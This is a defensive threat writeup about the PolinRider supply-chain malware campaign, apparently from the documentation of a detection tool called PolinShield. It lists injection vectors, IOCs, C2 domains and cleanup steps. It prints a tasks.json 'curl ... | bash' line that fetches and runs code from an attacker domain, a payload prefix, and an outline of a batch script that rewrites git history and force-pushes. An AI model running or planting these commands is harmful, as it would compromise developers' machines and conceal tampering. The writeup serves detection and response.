# PolinRider Supply-Chain Attack — Technical Writeup

> **Source:** [OpenSourceMalware/PolinRider](https://github.com/OpenSourceMalware/PolinRider) (the canonical threat dossier).
> **Severity:** CRITICAL — active supply-chain campaign attributed to DPRK threat actor cluster.
> **Last verified scope:** 2026-04-11 — **1,951+ public GitHub repositories**, **1,047+ unique owners** confirmed compromised.

This document summarizes the PolinRider campaign and explains how PolinShield maps to its IOCs. For the most up-to-date research, follow the [`#polinrider`](https://opensourcemalware.com/?search=%23polinrider) tag on opensourcemalware.com.

## Attribution

The OpenSourceMalware research team has attributed PolinRider to a **DPRK (North Korean) threat actor**, identified as a known Lazarus group contributor with operational connections to two other tracked clusters:

- **TasksJacker** — `.vscode/tasks.json` `curl | bash` infections
- **Contagious Interview** — fake job-interview "take-home test" lures (e.g. ShoeVista, StakingGame templates)

As of April 2026 these clusters have **operationally merged** under the PolinRider umbrella — same actor, same victim population, multiple parallel injection vectors.

## Scale of the campaign

| Metric | March 8, 2026 | April 11, 2026 | Δ in 5 weeks |
|---|---:|---:|---:|
| Unique repositories infected | 675 | **1,951** | **+1,276** |
| Unique owners affected | 352 | **1,047** | +695 |
| Individual users | 305 | ~930 | +625 |
| Organizations | 47 | ~117 | +70 |
| Distinct obfuscator variants | 1 | **2** | +1 |
| Distinct injection vectors | 1 | **4** | +3 |
| Documented C2 subdomains | 1 | **6+** | +5 |

The campaign is **doubling every ~5 weeks** and continues to evolve. PolinShield is updated as new IOCs are reported.

## Injection vectors

PolinRider infects victims through **four documented vectors**, all converging on the same payload:

### 1. Config-file injection (the original vector)

The malware appends heavily obfuscated JavaScript to the **end** of legitimate JS config files in the project root:

- `postcss.config.{js,mjs,cjs}`
- `tailwind.config.{js,mjs,cjs}`
- `eslint.config.{mjs,js}`
- `next.config.{js,mjs,ts}`
- `vite.config.{js,ts,mjs}`
- `babel.config.js`
- `webpack.config.js`, `gridsome.config.js`, `vue.config.js`
- `App.js`, `app.js`

The payload is appended on the same line as the closing `};` of the legitimate config, with hundreds of spaces of left-padding for visual stealth. Editors and PR diff views require horizontal scrolling to see it.

### 2. Malicious npm packages (compromised dependencies)

Several malicious packages have been confirmed in the Tailwind / PostCSS ecosystem, including:

- `tailwindcss-style-animate` (used in the **ShoeVista** weaponized take-home template)
- `tailwind-mainanimation`
- `tailwind-autoanimation`

These packages contain the payload directly and infect on `npm install` via postinstall scripts. The most successful spread: **Neutralinojs** (a popular framework with 8,400+ stars) was compromised, infecting hundreds of its downstream users in one stroke.

### 3. `.vscode/tasks.json` (TasksJacker convergence)

Compromised tasks.json files contain `curl | bash` payloads pointing at attacker-controlled Vercel-hosted C2 servers:

```
"command": "curl -fsSL https://default-configuration.vercel.app/settings/mac?flag=1 | bash"
```

The pattern is `https://<sub>.vercel.app/settings/(mac|linux|win)?flag=<N>`.

### 4. Fake font file (most stealth)

At least one victim (`AgbaD/odoo`) had the obfuscated payload hidden inside a `.woff2` font file at `public/fonts/fa-solid-400.woff2` that gets executed via Node. This is the most evasive variant — it survives source-only audits.

## Indicators of Compromise (IOCs)

These are the IOCs PolinShield checks for. Adding new ones is the most useful way to contribute — see [CONTRIBUTING.md](../CONTRIBUTING.md).

### Source-code signatures (canonical strings)

Two confirmed obfuscator variants:

| Variant | Signature substring | Shuffle seed | Secondary seed | Decoder fn |
|---|---|---|---|---|
| **v1** (original) | `rmcej%otb%` | `2857687` | `2667686` | `_$_1e42` |
| **v2** (April 2026 rotation) | `Cot%3t=shtP` | `1111436` | `3896884` | `MDy` |

Both are still active in the wild. PolinShield detects both.

### Payload prefix (both variants)

```
global['!']='X-NNNN-N'
```

Where `X` is a single character and `N` are digits. Always the first thing on the appended line.

### Forbidden filenames (Windows propagation artifacts)

- `temp_auto_push.bat` — git-history-falsification script (see below)
- `temp_interactive_push.bat`
- `config.bat` — referenced from tampered `.gitignore`

### .gitignore tampering

The malware modifies `.gitignore` to:
- **Remove** `.env*` (so any committed `.env` would leak secrets)
- **Add** `config.bat` (so its dropper artifacts don't get tracked)

### C2 infrastructure (all hosted on Vercel)

| Domain | Use |
|---|---|
| `auth-con-firm.vercel.app` | Primary C2 (config-file vector) |
| `auth-rho-dun.vercel.app` | Secondary C2 (config-file vector) |
| `260120.vercel.app` | Original C2 |
| `default-configuration.vercel.app` | Most-used `.vscode/tasks.json` C2 (~106 victim references) |
| `vscode-settings-bootstrap.vercel.app` | tasks.json C2 |
| `vscode-settings-config.vercel.app` | tasks.json C2 |
| `vscode-bootstrapper.vercel.app` | tasks.json C2 |
| `vscode-load-config.vercel.app` | tasks.json C2 |

PolinShield's Layer 2 (`/etc/hosts` block) covers `auth-con-firm` and `auth-rho-dun`. Adding the others is on the [roadmap](https://github.com/Louay24/polinshield/issues).

### Process pattern

```
node -e global['_V']='X-NNNN-N';global['r']=require;global['m']=module;(async()=>{...
```

A Node.js process whose argv begins with `node -e global['_V']=` and runs continuously. **No legitimate tool spawns this pattern.**

## The `temp_auto_push.bat` git-history rewrite

When PolinRider infects a Windows machine, it drops a batch file that **silently rewrites the most recent git commit while preserving its original timestamp** — making the malicious amendment invisible in `git log`:

```bat
:: Phase 1: Extract last commit metadata
git log -1 --format=%H:%M:%S, %an, %ae, etc.

:: Phase 2: Save current system time, then ROLL BACK the system clock
date %LAST_COMMIT_DATE%
time %LAST_COMMIT_TIME%

:: Phase 3: Amend the commit (now records with original timestamp)
git add .
git commit --amend -m "%LAST_COMMIT_TEXT%" --no-verify

:: Phase 4: Restore clock and force-push, bypassing all hooks
date %CURRENT_DATE%
time %CURRENT_TIME%
git push -uf origin %CURRENT_BRANCH% --no-verify
```

The presence of this file at a repo root is **direct evidence of past compromise**, even after the JS payload has been cleaned up. The corresponding macOS/Linux equivalent has not been left on victim machines (the actor cleans up better there) but the same git-rewriting behavior has been observed.

## Weaponized take-home templates (Contagious Interview)

PolinRider has weaponized fake job-interview "take-home" projects to lure developers:

- **ShoeVista** — fake Tailwind e-commerce assessment shipping malicious `tailwindcss-style-animate ^1.1.6` in `client/package.json`. ~46 confirmed compromised attempters.
- **StakingGame** — fake blockchain / VS Code automation project, identified by UUID `e9b53a7c-2342-4b15-b02d-bd8b8f6a03f9` in tasks.json. ~42 confirmed compromised attempters.

If you receive a "take-home test" from an unknown recruiter, **run it in a VM, never on your dev machine**.

## Why detection is hard

1. **Visual stealth.** The payload is appended on the same line as legitimate code, with whitespace padding, requiring horizontal scroll to see in editors and GitHub diffs.
2. **Bundles with real work.** The malware doesn't push standalone — it intercepts your real commits and adds the payload + `.gitignore` mods to them. The commit looks legitimate.
3. **History falsification.** `temp_auto_push.bat` rewrites timestamps so amended commits look untouched in `git log`.
4. **Variant rotation.** The `Cot%3t=shtP` variant was introduced specifically to evade the public YARA rule for `rmcej%otb%`. Static IOC lists go stale fast.
5. **Multi-vector.** Even if you check JS configs, the payload may live in `.woff2`, `.vscode/tasks.json`, or a transitive npm dep.
6. **Re-infection.** OSM has documented at least one repo (`HassanHabibTahir/testclient`) with markers from BOTH variants — the actor is re-running tooling against previously-cleaned victims.

## Defense priorities

In order of cost-effectiveness:

1. **Block npm postinstall scripts globally** with `ignore-scripts=true`. This single setting would have prevented infection via injection vectors 2 (malicious npm packages) entirely, and most variants of vector 1. Trade-off: legitimate packages with native bindings (sharp, node-canvas) need `--foreground-scripts` after auditing.
2. **DNS-block known C2 domains** in `/etc/hosts`. Even if reinfected, the malware can't reach its operator.
3. **Pre-commit hook** that fails on any IOC string and on `.env` / forbidden batch filenames. Stops infected files from reaching the remote.
4. **Force-push monitoring** via the GitHub Events API. Catches the propagation phase even if local detection fails.
5. **Daily disk scan** for IOCs. Backstop for cases where layers 1–4 fail.

PolinShield implements all five.

## YARA rule (from OSM)

OSM publishes a [YARA rule](https://github.com/OpenSourceMalware/PolinRider) covering both obfuscator variants. Add it to your static analysis pipeline.

## Cleanup checklist (if you're infected)

1. **Kill the malware:** `ps aux | grep "node -e global" | grep -v grep | awk '{print $2}' | xargs kill -9`
2. **Find injection sites:**
   ```bash
   # Both variants
   grep -rE "rmcej%otb%|Cot%3t=shtP" \
     --include='*.js' --include='*.mjs' --include='*.cjs' --include='*.ts' \
     ~/Desktop ~/code ~/work 2>/dev/null | grep -v node_modules
   ```
3. **Find propagation artifacts:** `find ~ -name 'temp_auto_push.bat' -o -name 'config.bat' 2>/dev/null`
4. **Audit `.gitignore`:** make sure `.env*` is present, `config.bat` is removed.
5. **Audit binary assets:** look for unexpected `.woff` / `.woff2` files in `public/`, `static/`, `assets/`.
6. **Audit `.vscode/tasks.json`** for `curl | bash` patterns.
7. **Audit `package.json`** for recently added Tailwind/PostCSS packages.
8. **Strip the payload** from infected files (everything after the legitimate config's closing `};` or `export default` block).
9. **Delete malware-dropped `.env` files** containing the C2 base64 strings.
10. **Force-push clean versions** to all remotes the malware touched.
11. **Rotate every credential** that was on the machine: GitHub PATs, npm tokens, GitLab tokens, JWT secrets, cloud keys, SSH keys.
12. **Re-pull all team repos** to get the cleaned versions before resuming work.
13. **Reboot.**

## Credentials at risk

If your `.npmrc` had auth tokens in plaintext (the common case for private GitHub Packages / GitLab npm), the malware had access via reading `~/.npmrc`. Tokens to rotate:

- GitHub PATs (`ghp_*`, `gho_*`)
- npm tokens (`npm_*`)
- GitLab tokens (`glpat-*`)
- Any `_authToken` lines in `.npmrc`

If you committed any `.env` files (which the malware tries to enable by tampering `.gitignore`), assume those secrets leaked too.

## References

- 🔬 **[OpenSourceMalware/PolinRider](https://github.com/OpenSourceMalware/PolinRider)** — the canonical threat dossier (read this first)
- 📰 [Risky Business: GitHub is starting to have a real malware problem](https://news.risky.biz/risky-bulletin-github-is-starting-to-have-a-real-malware-problem/)
- 🐛 [npm advisory database](https://github.com/advisories)
- 📖 OSM tag: [#polinrider](https://opensourcemalware.com/?search=%23polinrider) — best source for current data

## Reporting new variants or IOCs

If you find:
- A new obfuscator variant
- A new C2 domain
- A newly-compromised npm package
- A new injection vector
- A new fake-interview template

…please [open an issue](https://github.com/Louay24/polinshield/issues/new) on PolinShield and submit it to the [OSM PolinRider repo](https://github.com/OpenSourceMalware/PolinRider/issues). Confirmed reports get added to the bash defenses in the next PolinShield release.
